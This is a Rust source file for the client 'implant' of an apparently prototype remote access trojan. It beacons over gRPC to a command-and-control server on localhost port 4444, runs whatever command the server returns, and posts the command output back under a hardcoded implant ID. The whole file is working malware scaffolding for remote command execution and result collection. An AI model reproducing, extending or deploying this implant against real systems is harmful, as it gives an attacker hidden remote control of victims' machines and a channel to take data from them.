use remote_access_trojan::rat::ask_for_instructions_client::AskForInstructionsClient;
use remote_access_trojan::rat::record_command_result_client::RecordCommandResultClient;
use remote_access_trojan::rat::{self, Beacon, CommandResponse};
use std::process::Command;
use tonic::transport::Endpoint;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("implant");

    // Does the protobuf structure work?
    let example = rat::Beacon {
        last_received: 0
    };
    println!("{example:?}");

    // Can I send a protobuf from the client to the server?
    let addr = Endpoint::from_static("http://127.0.0.1:4444");
    let mut client = AskForInstructionsClient::connect(addr).await?;
    let request = tonic::Request::new(
        Beacon {
            last_received: 0
        },
    );
    let response = client.send(request).await?.into_inner();
    println!("Response={response:?}");
    let command_received = response.command;
    if !command_received.is_empty() {
        let command = Command::new(&command_received)
                              .output()
                              .unwrap();
        let command_response = String::from_utf8(command.stdout).unwrap();
        println!("{command_response:?}");
        let addr = Endpoint::from_static("http://127.0.0.1:4444");
        let mut client = RecordCommandResultClient::connect(addr).await?;
        let result = tonic::Request::new(
            CommandResponse {
                implant_id:String::from("4f12d"),
                timestamp: 100000,
                command:String::from(command_received),
                result:String::from(command_response)
            },
        );
        let response = client.send(result).await?.into_inner();
    }

    Ok(())
}